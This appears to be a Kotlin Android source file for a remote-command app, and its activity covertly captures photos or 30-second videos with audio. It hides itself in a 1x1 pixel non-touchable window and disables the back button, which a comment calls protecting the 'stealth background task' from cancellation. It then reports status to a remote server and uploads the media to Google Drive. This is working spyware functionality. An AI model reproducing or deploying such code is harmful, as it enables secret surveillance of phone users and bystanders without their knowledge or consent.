package com.neubofy.veto.ui

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Size
import android.view.Surface
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.core.Preview
import androidx.camera.core.resolutionselector.ResolutionSelector
import androidx.camera.core.resolutionselector.ResolutionStrategy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.concurrent.futures.await
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.lifecycle.lifecycleScope
import com.neubofy.veto.databinding.ActivityDummyCameraxBinding
import com.neubofy.veto.transports.NextJsServerTransport
import com.neubofy.veto.utils.MediaStorageManager
import com.neubofy.veto.utils.MediaSyncManager
import com.neubofy.veto.utils.imageToByteArray
import com.neubofy.veto.utils.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.coroutines.resume

class DummyCameraxActivity : AppCompatActivity() {

    private lateinit var viewBinding: ActivityDummyCameraxBinding
    private lateinit var cameraExecutor: ExecutorService
    private var cameraExtra: Int = CAMERA_BACK
    private var shouldFlash: Boolean = false
    private var hasStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!hasCameraPermission()) {
            this.log().w(TAG, "Camera permission is missing. Not taking picture.")
            finish()
            return
        }
        viewBinding = ActivityDummyCameraxBinding.inflate(layoutInflater)
        setContentView(viewBinding.root)

        window.setGravity(android.view.Gravity.TOP or android.view.Gravity.START)
        window.setLayout(1, 1)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        )
        @Suppress("DEPRECATION")
        overridePendingTransition(0, 0)

        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Do nothing to prevent user from cancelling the stealth background task
            }
        })

        cameraExecutor = Executors.newSingleThreadExecutor()
    }

    override fun onResume() {
        super.onResume()
        if (hasStarted) return
        hasStarted = true
        cameraExtra = intent.extras?.getInt(EXTRA_CAMERA) ?: CAMERA_BACK
        shouldFlash = intent.extras?.getBoolean(EXTRA_FLASH) ?: false

        lifecycleScope.launch {
            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
            // Ensure any overall hardware lockup times out after a hard limit
            val result = withTimeoutOrNull(45000L) {
                com.neubofy.veto.utils.CommandQueueManager.runMediaCommandInQueue {
                    if (commandName == "video") {
                        recordVideo()
                    } else {
                        takePhoto()
                    }
                }
            }
            if (result == null) {
                this@DummyCameraxActivity.log().e(TAG, "Media operation timed out.")
                val transport = NextJsServerTransport(applicationContext)
                transport.send(applicationContext, "Camera operation timed out.", commandName)
                finish()
            }
        }
    }

    override fun onNewIntent(intent: android.content.Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraExecutor.shutdown()
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            baseContext, Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun takePhoto() {
        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
        val ctx = applicationContext

        val flashMode = if (shouldFlash && cameraExtra == CAMERA_BACK) {
            ImageCapture.FLASH_MODE_ON
        } else if (shouldFlash && cameraExtra == CAMERA_FRONT) {
            ImageCapture.FLASH_MODE_SCREEN
        } else {
            ImageCapture.FLASH_MODE_OFF
        }

        val cameraProvider = ProcessCameraProvider.getInstance(this).await()
        val builder = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .setFlashMode(flashMode)
            .setTargetRotation(Surface.ROTATION_0)
            .setResolutionSelector(
                ResolutionSelector.Builder().setResolutionStrategy(
                    ResolutionStrategy(
                        Size(720, 1280),
                        ResolutionStrategy.FALLBACK_RULE_CLOSEST_LOWER_THEN_HIGHER
                    )
                ).build()
            )

        if (shouldFlash && cameraExtra == CAMERA_FRONT) {
            viewBinding.screenFlashView.isVisible = true
            viewBinding.screenFlashView.setScreenFlashWindow(this.window)
            viewBinding.screenFlashView.screenFlash?.let {
                builder.setScreenFlash(it)
            }
        }

        val imageCapture = builder.build()
        val cameraSelector =
            if (cameraExtra == CAMERA_FRONT) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        cameraProvider.unbindAll()
        try {
            // Bind Dummy Preview alongside ImageCapture to satisfy hardware camera HAL requirements
            val preview = Preview.Builder().build()
            cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageCapture)
        } catch (e: Exception) {
            this.log().e(TAG, "Cannot take picture: bindToLifecycle failed. ${e.message}")
            val transport = NextJsServerTransport(ctx)
            transport.send(ctx, "Photo capture failed: bindToLifecycle error", commandName)
            finish()
            return
        }

        // Suspend with 10-second strict timeout for image capture callback
        val imgBytes = withTimeoutOrNull(10000L) {
            suspendCancellableCoroutine<ByteArray?> { cont ->
                imageCapture.takePicture(
                    cameraExecutor,
                    object : ImageCapture.OnImageCapturedCallback() {
                        @androidx.annotation.OptIn(androidx.camera.core.ExperimentalGetImage::class)
                        override fun onCaptureSuccess(image: ImageProxy) {
                            super.onCaptureSuccess(image)
                            val img = image.image
                            if (img == null) {
                                if (cont.isActive) cont.resume(null)
                                image.close()
                                return
                            }
                            val bytes = imageToByteArray(img)
                            image.close()
                            if (cont.isActive) cont.resume(bytes)
                        }

                        override fun onError(exception: ImageCaptureException) {
                            super.onError(exception)
                            this@DummyCameraxActivity.log().w(TAG, "Failed to take picture: ${exception.imageCaptureError}")
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                )
            }
        }

        cameraProvider.unbindAll()

        if (imgBytes != null && imgBytes.isNotEmpty()) {
            savePhotoAndFinish(imgBytes, commandName)
        } else {
            val transport = NextJsServerTransport(ctx)
            transport.send(ctx, "Photo capture failed or timed out.", commandName)
            finish()
        }
    }

    private suspend fun savePhotoAndFinish(imgBytes: ByteArray, commandName: String) {
        val ctx = applicationContext
        val photosDir = MediaStorageManager.getPhotosDir(ctx)
        val photoFile = File(photosDir, "photo_${System.currentTimeMillis()}.jpg")

        withContext(Dispatchers.IO) {
            photoFile.writeBytes(imgBytes)
        }

        // Send Step 2 status message
        val transport = NextJsServerTransport(ctx)
        transport.send(
            ctx,
            "Photo captured successfully! Saved locally to ${photoFile.name}. Queued for Google Drive upload...",
            commandName
        )

        // Close activity immediately so camera hardware is freed
        finish()

        // Trigger smart syncer for recent files (< 1 min)
        MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
    }

    private suspend fun recordVideo() {
        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "video"
        val ctx = applicationContext
        val cameraProvider = ProcessCameraProvider.getInstance(this).await()

        val qualitySelector = androidx.camera.video.QualitySelector.from(
            androidx.camera.video.Quality.SD,
            androidx.camera.video.FallbackStrategy.lowerQualityOrHigherThan(androidx.camera.video.Quality.SD)
        )
        val recorder = androidx.camera.video.Recorder.Builder()
            .setExecutor(cameraExecutor)
            .setQualitySelector(qualitySelector)
            .build()
        val videoCapture = androidx.camera.video.VideoCapture.withOutput(recorder)

        val cameraSelector =
            if (cameraExtra == CAMERA_FRONT) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        cameraProvider.unbindAll()
        try {
            val preview = Preview.Builder().build()
            cameraProvider.bindToLifecycle(this, cameraSelector, preview, videoCapture)
            kotlinx.coroutines.delay(1000L)
        } catch (e: Exception) {
            this.log().e(TAG, "Cannot record video: bindToLifecycle failed. ${e.message}")
            val transport = NextJsServerTransport(ctx)
            transport.send(ctx, "Video recording failed: bindToLifecycle error", commandName)
            finish()
            return
        }

        val videosDir = MediaStorageManager.getVideosDir(ctx)
        val videoFile = File(videosDir, "video_${System.currentTimeMillis()}.mp4")
        val outputOptions = androidx.camera.video.FileOutputOptions.Builder(videoFile).build()

        val pendingRecording = recorder.prepareRecording(this, outputOptions)

        @Suppress("MissingPermission")
        val recording = pendingRecording.withAudioEnabled().start(ContextCompat.getMainExecutor(this)) { event ->
            if (event is androidx.camera.video.VideoRecordEvent.Finalize) {
                if (event.hasError()) {
                    ctx.log().e(TAG, "Video capture failed: ${event.error}")
                    videoFile.delete()
                }
            }
        }

        kotlinx.coroutines.delay(30000L) // 30s video
        recording.stop()
        cameraProvider.unbindAll()

        if (videoFile.exists() && videoFile.length() > 0) {
            val transport = NextJsServerTransport(ctx)
            transport.send(
                ctx,
                "Video captured successfully! Saved locally to ${videoFile.name}. Queued for Google Drive upload...",
                commandName
            )
            finish()
            MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
        } else {
            val transport = NextJsServerTransport(ctx)
            transport.send(ctx, "Video recording failed to produce file.", commandName)
            finish()
        }
    }

    companion object {
        val TAG = DummyCameraxActivity::class.simpleName

        const val EXTRA_COMMAND = "EXTRA_COMMAND"
        const val EXTRA_CAMERA = "EXTRA_CAMERA"
        const val EXTRA_FLASH = "EXTRA_FLASH"
        const val CAMERA_BACK = 0
        const val CAMERA_FRONT = 1
    }
}
